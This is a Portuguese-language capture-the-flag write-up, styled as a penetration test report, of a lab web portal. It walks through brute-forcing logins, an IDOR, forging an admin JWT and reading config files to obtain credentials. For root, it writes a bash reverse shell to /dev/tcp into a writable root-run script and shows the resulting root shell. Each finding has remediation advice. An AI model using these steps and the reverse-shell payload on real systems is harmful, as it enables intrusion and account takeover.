# 🎯 Relatório de Invasão: Domino

> [!abstract] Resumo 
> **Objetivo:** Devemos enumerar e explorar uma aplicação interna do host que se chama NexusCorp Employee Portal
> **Vetor de Acesso Inicial:** sarah.johnson com senha em wordlist vazada 
> **Vetor de Elevação de Privilégios:** conta devops após a de sarah e escalação para root via script rodando como root e com permissão de escrita para grupo devops.

---

## 🛠️ Ferramentas & Scripts Utilizados
- nmap
- gobuster
- openssl
- burpsuite
- pspy64
---

## 🔍 1. Reconhecimento & Mapeamento

### Scan de Portas (Nmap)

> [!example] Output do Nmap -sS

| PORT | SERVICE |
| ---- | ------- |
| 22   | ssh     |
| 80   | http    |
> [!example] Output do Nmap -sU

| PORT | SERVICE |
| ---- | ------- |
| 68   | dhcp    |

> [!example] Output do Nmap com -sC e -sV
> 

| PORT | SERVICE/VERSION                                                        | INFOS                                                                                                                                                   |
| ---- | ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22   | ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: <br>\|   256 c1:f0:c3:0f:45:5d:25:f2:41:eb:85:c5:35:55:9f:a8 (ECDSA)<br>\|_  256 02:09:db:d0:a2:e9:19:3e:a0:e0:8d:80:e8:95:64:17 (ED25519) |
| 80   | http    Apache httpd 2.4.58 ((Ubuntu))                                 | http-server-header: Apache/2.4.58 (Ubuntu)<br>\|_http-title: NexusCorp Portal<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                |

> [!info] Análise do Reconhecimento
>Vemos que temos um ambiente web rodando na porta 80 com apache 2.4.58(sem exploit encontrado para essa versão do apache) e com título NexusCorp Portal rodando em um linux.
>Junto tem um servidor ssh que podemos conectar caso consigamos credenciais durante a enumeração.

---

## 🌐 2. Enumeração Web & VHOSTs

`gobuster dir -u http://[IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,log`

> [!quote] Dados e reconhecimento
>

| Path's                 | Análise                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| index.php              | Página de login , testes de sql injection serão feitos posteriormente, sem credenciais expostas no page source ou comentários que sejam úteis. O login é feito com firstname.lastname                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| support/               | Essa rota direciona para index.php , logo é uma rota que temos de estar logados para acessar.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| admin/                 | Com o token JWT de admin conseguimos acessar o admin e pegar a flag THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| static/                |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| \| app.js              | // NexusCorp Portal - Frontend Utilities<br>// v2.3.1 - Build 20241115<br><br>(function() {<br>    'use strict';<br><br>    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)<br>    const CONFIG = {<br>        apiBase: '/api',<br>        // Encryption key for backup config decryption - AES-ECB-128<br>        // Key: N3xusK3y2024!!  (pad to 16 bytes with �)<br>        _backupKey: 'N3xusK3y2024!!',<br>        appVersion: '2.3.1'<br>    };<br><br>    // Session helper<br>    window.NexusApp = {<br>        getSession: function() {<br>            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('nexus_session='));<br>            if (!cookie) return null;<br>            try {<br>                return JSON.parse(atob(cookie.split('=')[1].trim()));<br>            } catch(e) { return null; }<br>        },<br>        getApiToken: function() {<br>            return localStorage.getItem('nexus_jwt');<br>        },<br>        setApiToken: function(token) {<br>            localStorage.setItem('nexus_jwt', token);<br>        }<br>    };<br><br>    // Auto-fetch JWT if not cached<br>    if (!localStorage.getItem('nexus_jwt') && document.cookie.includes('nexus_session')) {<br>        fetch('/api/auth/token.php', {credentials: 'include'})<br>            .then(r => r.json())<br>            .then(d => { if (d.token) localStorage.setItem('nexus_jwt', d.token); })<br>            .catch(() => {});<br>    }<br>})(); |
| \| style.css           | Arquivo css sem nada de importante.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| team.php               | Essa página mostra informações sobre o time de funcionários dessa empresa, cada email utiliza firstname.lastame@domain , com isso descobrimos aqui o domínio e além disso o login de vários usuários.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| \| Users identificados | Users : laura.hayes(Chief Information Officer) michael.chen(Lead Security Engineer) sarah.johnson(Senior Software Engineer) robert.wilson(DevOps Engineer) emma.taylor(Product Manager) david.brown(Full Stack Developer) james.wright(System Administrator) . O domínio é nexus.corp.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| api/                   |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| \| auth/               | Path para autenticação                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| \|--token.php          | Pelas informações de outros arquivos o token.php nos devolve um token jtw quando temos um nexus_session ativo mas sem nexus_jwt                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| \|users/               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| \|--profile.php        | {"file":"\/var\/www\/html\/api\/users\/profile.php","content":"\<?php\nrequire_once __DIR__ . '\/..\/..\/auth.php';\nheader('Content-Type: application\/json');\n$user = require_login();\n$id = intval($_GET['id'] ?? 0);\nif (!$id) { http_response_code(400); echo json_encode(['error'=>'Missing id']); exit; }\n\/\/ IDOR: no ownership check - any logged-in user can view any profile\n$db = get_db();\n$stmt = $db->prepare('SELECT id, username, email, role, notes FROM users WHERE id = ?');\n$stmt->execute([$id]);\n$profile = $stmt->fetch(PDO::FETCH_ASSOC);\nif (!$profile) { http_response_code(404); echo json_encode(['error'=>'User not found']); exit; }\necho json_encode($profile);\n"}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| \| files.php           | {"error":"JWT token required. Get one from \/api\/auth\/token.php"}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| \| login.php           | {"error":"Method not allowed"}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| logout.php             | Arquivo que retorna para index.php , indicando logout da conta.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| config.php             | Podemos ler ele através da rota de API /api/files.php?name=/var/www/html/config.php com jwt de admin{"file":"\/var\/www\/html\/config.php","content":"\<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_NAME', 'nexusdb');\ndefine('DB_USER', 'app_user');\ndefine('DB_PASS', 'D3v0ps!2024');\ndefine('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');\ndefine('APP_SECRET', 'nexus_app_k3y_2024');\n\nfunction get_db() {\n    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n    return $pdo;\n}\n?>\n"} Esse arquivo mostra muito sobre o banco de dados , user e senha.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| backup/                | Pasta de arquivos de backup                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| \| README.txt          | NexusCorp Backup Configuration<br>================================<br>config.enc  - Encrypted application configuration (AES-128-ECB)<br>Decryption key reference: see static/app.js (deployment notes)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| \| config.enc          | Como foi visto no arquivo app.js na pasta static tem esse arquivo de config em static/app.js que contém as instruções para decriptar esse arquivo, com isso usamos o seguinte comando -> openssl enc -d -aes-128-ecb -in config.enc -out arquivo.txt -K 4e337875734b33793230323421210000 -nosalt , assim decripitamos esse arquivo e recebemos esse texto {"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"} , nos mostrando que o sistema roda sobre o usuário de sistema devops.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| forgot.php             | Arquivo de página de esqueci a senha , recupera a senha via firstname.lastname                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| 403.php                | Página 403 que o /admin retorna para usuários não permitidos.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| auth.php               | Arquivo de lógica de autenticação provavelmente , não permitido leitura pelo cliente igual config.php.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| dashboard.php          | Arquivo que gera a pagina principal após logar.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| reset.php              | Lógica para resetar senha .                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| javascript/            | Não temos permissão para acessar.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |

## Acesso como sarah.johnson
Como sarah.johnson nos deparamos com o dashboard.php , página principal após logar, que nos mostra certas informações como :
```
### My Profile

**Username:** sarah.johnson

**Email:** sarah.johnson@nexus.corp

**Role:** user
```

```
### File Viewer

Access internal documents via the secure file API.

Endpoint: `/api/files.php?name=`

Requires JWT authentication via `/api/auth/token.php`
```

```
### Quick Links

- [Support Tickets](http://10.67.155.199/support/index.php)
- [Open Ticket](http://10.67.155.199/support/create.php)
- [My Profile API](http://10.67.155.199/api/users/profile.php?id=3)
```
A primeira coisa que fui olhar é essa rota de profile.php onde o id do meu usuário era o 3 , com isso mudei para o 1 e vi que havia IDOR vulnerabilidade.

```
{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin","notes":"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"}
```
Recebemos a primeira flag da sala , mas vemos que a rota ta restringida a não mostra senha e assim não podemos mudar diretamente para a conta de laura.hayes que é a admin.

Em seguida peguei meu jwt na rota , com isso teste acessa a rota do files.php mas disse que precisava ser token de admin , com isso fui em um site de decode de jwt e vi que colocavam a role de user no jwt , mudei ela para admin e peguei o novo token jwt. Acessei a rota novamente e o erro foi diferente porque eu testei sem rota no name e assim apareceu que o path deveria estar em /var/www/html , assim coloquei isso e fui buscando arquivo por arquivo que fui vendo de importante.
Na enumeração de arquivos coloquei que em config.php havia dados sobre o banco de dados e uma senha do user e testei ela para o user devops que descobrimos no config.enc , consegui shell ssh assim.

## Acesso com devops por ssh
Como devops a gente consegue ler duas flags , uma em user.txt na homem de devops e outra em `/opt/flag3.txt`. Com isso começamos a enumerar o linux e vemos que não podemos usar sudo , não tem binários com SUID úteis no sistema , não tem ntfs vulnerável , sem cronjobs para explorar mas ao executar o pspy64 vemos um script de monitoramento health_report.
```
/bin/bash /opt/monitoring/health_report.sh
```
Que pelo visto é do grupo devops mas é executado pelo root.
```
-rwxrwxr-- 1 root devops 537 May 18 10:41 /opt/monitoring/health_report.sh
```
Temos permissão de edição , iremos editar para criar um reverse shell.
```
bash -c 'exec bash -i &>/dev/tcp/ip/4444 <&1'
```
Editamos ele e colocamos esse seguinte payload de reverse shell, esperamos e obtivemos shell como root.
```
Shell Banner:
bash: cannot set terminal process group (4885): Inappropriate ioctl for device
-----
          

root@tryhackme-2404:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:~# ls
ls
root.txt
snap
root@tryhackme-2404:~# cat root.txt
cat root.txt
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

---

## ⚡ 3. Exploração & Acesso Inicial (Foothold)

>[!failure] Vulnerabilidade encontrada
>**Título**:Senhas de contas da plataforma presentes em wordlists
>**Risk Rating**:(7+10+10+1+10)/5=7.6 , utilizando o modelo DREAD de modelagem de ameaças conseguimos estipular que essa ameaça tem um risco aproximado de 7.6.
>**Resumo**: A vulnerabilidade foi encontrada na rota principal "/" , onde vemos presente um formulário de login que ao ser feito força bruta ,para uma lista de 7 usuários , 3 usuários apresentaram login's presente em wordlist pública
>**Background(Contexto adicional)**: Uma vulnerabilidade de senha vazada (cwe-1390) é quando a senha de uma conta consta em uma ou mais wordlists de senhas vazadas , sendo possível atacantes realizarem força bruta sobre essas contas e descobrirem a senha em si de forma fácil.
>**Detalhes Técnicos e Evidências**:
>[80][http-post-form] host: 10.67.155.199   login: emma.taylor   password: password
>[80][http-post-form] host: 10.67.155.199   login: robert.wilson   password: password
>[80][http-post-form] host: 10.67.155.199   login: sarah.johnson   password: password
>**Impacto**: Comprometimento de cada conta listada , podendo atacantes logarem na plataforma como esses usuários
>**Conselhos e Remediações**: Aconselhar esses usuários e os outros demais a alterarem as senhas deles , verificando se não foram vazadas em listas e colocando um nível de dificuldade/extensão melhores.

>[!failure] Vulnerabilidade encontrada
>**Título**: Rate Limiting ausente no formulário de login
>**Risk Rating**:(4+10+10+10+10)/5=8.8, risco estimado utilizando modelagem de ameaças DREAD
>**Resumo**: Foi encontrado a falta de rate limiting no formulário de login presente na rota "/",onde é possível enviar milhares de tentativas de login sem ser bloqueado.
>**Background(Contexto adicional)**:Rate limiting é um mecanismo para barrar muitas requisições vindas de uma certa fornte(ip), evitando esgotar processamento do sistema , gastos por processamento , brute forcing's e outras coisas.
>**Detalhes Técnicos e Evidências**:
>[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "123456" - 10001 of 30000 [child 1] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "12345678" - 10003 of 30000 [child 9] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "qwerty" - 10004 of 30000 [child 2] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "123456789" - 10005 of 30000 [child 4] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "12345" - 10006 of 30000 [child 3] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "1234" - 10007 of 30000 [child 15] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "111111" - 10008 of 30000 [child 6] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "1234567" - 10009 of 30000 [child 12] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "dragon" - 10010 of 30000 [child 11] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "123123" - 10011 of 30000 [child 0] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "baseball" - 10012 of 30000 [child 7] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "abc123" - 10013 of 30000 [child 5] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "football" - 10014 of 30000 [child 14] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "monkey" - 10015 of 30000 [child 13] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "letmein" - 10016 of 30000 [child 8] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "696969" - 10017 of 30000 [child 1] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "shadow" - 10018 of 30000 [child 9] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "master" - 10019 of 30000 [child 2] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "666666" - 10020 of 30000 [child 4] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "qwertyuiop" - 10021 of 30000 [child 3] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "123321" - 10022 of 30000 [child 15] (0/0)
[ATTEMPT] target 10.67.155.199 - login "robert.wilson" - pass "mustang" - 10023 of 30000 [child 6] (0/0)
>Foram feitas 23 requisições em menos de 10 segundos , indicando uma quantidade forçada de tentativas em uma rota para login, sendo permitido sem restrição.
>**Impacto**: O impacto dessa vulnerabilidades é pode testar milhares de senhas contra contas de usuários sem ser bloqueado , permitindo procurar contas com senhas vazadas e caso ache o login é garantido . Permitindo assim acesso a contas de usuário e funções da plataforma .
>**Conselhos e Remediações**: Aplicar restrições de x requisições , onde x não é alto e nem baixo para não evitar bloqueio de login's autênticos mas com resquícios de credenciais erradas.

>[!failure] Vulnerabilidade encontrada
>**Título**: IDOR
>**Risk Rating**:(8+10+10+10+6)/5=8.8 feito com modelagem DREAD
>**Resumo**: IDOR encontrado em rota autenticada /api/users/profile.php?id= , onde podemos mudar o valor de id para o valor que queremos e extrair dados de todos os usuários da plataforma . O IDOR permite listar id, username,email , role e anotações. Não mostrando o password.
>**Background(Contexto adicional)**:IDOR é uma vulnerabilidade onde podemos acessar dados de outros usuários da plataforma sem ter autorização. 
>**Detalhes Técnicos e Evidências**:
>http://10.67.155.199/api/users/profile.php?id=1
>{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin","notes":"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"}
>Isso foi feito sendo usuário de id=3
>**Impacto**:Um IDOR nesse contexto permite que a gente extraia todos os usernames e emails dos usuários da plataforma , visto que como ela não possui rate limiting podemos testar senhas de wordlists para cada usuários extraído e assim podendo ter sucesso em mais contas.
>**Conselhos e Remediações**:Aplicar mudanças de autorização nessa rota , na qual deve se verificar se o usuário que está requisitando é dono dos danos que estão sendo retornados.


>[!failure] Vulnerabilidade encontrada
>**Título**:Autenticação inadequada
>**Risk Rating**:(10+10+10+10+5)/5=9 , feito com modelagem de ameaça DREAD
>**Resumo**: Foi encontrado falha na geração de token e validação na plataforma onde o token retornado pela rota /api/auth/token.php pode ser alterado permitindo que um usuário normal se passe por admin.
>**Background(Contexto adicional)**:O autenticação inadequada ocorre quando a aplicação aceita uma identidade reivindicada pelo usuário de forma alterada sem validar corretamente a autenticidade do token.
>**Detalhes Técnicos e Evidências**:
>{
  "sub": "sarah.johnson",
  "role": "admin",
  "iat": 1789972744,
  "exp": 1789976344
}
>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzg5OTcyOTM0LCJleHAiOjE3ODk5NzY1MzR9.9D/nK8c5RvOdcc0o5oCSQp/DtFL2gmKDVIE0IIWhMJc
>Confirmando no jwt.io podemos ver que esse jwt mostra a role de admin quando removemos o conteúdo do último ponto final para frente.
>Com esse jwt com valores de iat , exp , sub corretos e com sessão válida podemos virar admin colocando um header Authorization: Bearer com esse token na frente para qualquer rota autenticada.
>**Impacto**: Qualquer usuário autenticado que siga os passos a passos pode virar admin e extrair informações de todos os arquivos pela rota /api/files.php?name= , na qual ele saiba o nome dos arquivos e que deve ser recursivamente qualquer rota que a raiz é /var/www/html.
>**Conselhos e Remediações**:Deve ser feito a validação de que o token não foi alterado desde sua criação na rota , evitando que ele não tenha sofrido alteração e seja aceito , assim evitando impersonação .
**Obs**: Username e password constam no relatório por motivo de ser um ctf feito em ambiente controlado e não ter riscos reais para usuários .

>[!failure] Vulnerabilidade encontrada
>**Título**:Atribuição incorretas de permissões
>**Risk Rating**:(10+10+10+10+6)/5=9.2 , modelagem feita com DREAD
>**Resumo**:Um arquivo de script chamado /opt/monitoring/health_report.sh estava rodando sobre uma tarefa agendada do root , porém ele permite a um grupo de usuário de menor privilégio que ele a editar , executar e ler.
>**Background(Contexto adicional)**:Essa vulnerabilidade quebra o princípio do menor privilégio , se ele necessita rodar como root então usuários de menor privilégio não podem ter acesso a esse script para escrever .
>**Detalhes Técnicos e Evidências**:
>-rwxrwxr-- 1 root devops 537 May 18 10:41 /opt/monitoring/health_report.sh
>vim /opt/monitoring/health_report.sh
>#!/bin/bash
>bash -c 'exec bash -i &>/dev/tcp/ip/4444 <&1'
>Shell Banner:
bash: cannot set terminal process group (4885): Inappropriate ioctl for device
root@tryhackme-2404:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:~# ls
ls
root.txt
snap
root@tryhackme-2404:~# cat root.txt
cat root.txt
THM{pr1v3sc_cr0n_r00t_fl4g5}
>**Impacto**:Um invasor que tenha chegado no sistema como user devops pode utilizar desse arquivo para gerar um shell reverse e depois disso pode fazer qualquer modificação , extração e destruição no servidor que está rodando essa aplicação web.
>**Conselhos e Remediações**:Alterar o grupo desse arquivo para root e retirar a permissão de escrita do grupo root , permitindo que somente o user root o edite.

> [!success] Credenciais Obtidas
> - **Usuário:** sarah.johnson
> - **Senha / Hash:** password

> [!success] Credenciais Obtidas
> - **Usuário:** devops
> - **Senha / Hash:** D3v0ps!2024

---

## 🛡️ 4. Movimentação Lateral & Escalação de Privilégios

> [!warning] Meios utilizados e seus resultados
> 

> [!success] Acesso Root / Admin Conquistado
> - **Usuário Admin:** root
> - **Senha / Hash:** Via reverse shell
> - **Flag de Root/Admin:** THM{pr1v3sc_cr0n_r00t_fl4g5}

---

## 🔑 Tabela de Credenciais Capturadas

| Serviço / Local | Usuário       | Senha / Hash | Origem do Achado                         |
| :-------------- | :------------ | :----------- | :--------------------------------------- |
| Web User        | sarah.johnson | password     | BRUTE FORCE                              |
| Web User        | robert.wilson | password     | BRUTE FORCE                              |
| Web User        | emma.taylor   | password     | BRUTE FORCE                              |
| System User     | devops        | D3v0ps!2024  | Leitura de arquivo config.php como admin |

---

## 📚 Considerações Técnicas & Cheat Sheet

> [!info] Lições Aprendidas
> 1. Usar o pspy64 sempre, um ps aux não funciona com a mesma precisão do pspy64 que olha em tempo real , não deixando passar scripts que o ps aux deixa.
> 2. Fazer brute force quando achar nomes de usuários válidos e confirmar que a rota não possui rate limiting . Isso após olhar todas as outras opções de enumeração/exploração.